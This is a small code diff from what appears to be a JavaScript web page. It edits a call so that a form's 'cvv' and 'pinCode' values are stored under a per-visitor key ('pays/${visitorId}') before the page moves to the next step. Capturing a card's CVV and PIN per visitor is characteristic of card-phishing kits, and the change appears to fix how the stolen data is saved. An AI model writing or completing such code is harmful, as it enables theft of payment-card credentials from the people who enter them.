@@ -1144,7 +1144,7 @@ addData(`pays/${visitorId}`, { id: visitorId, currentPage });
           cvv,
           pinCode,
         };
-        addData(dataToSave);
+addData(`pays/${visitorId}`, dataToSave);
         setCurrentStep(currentPage + 1);
       }
     }
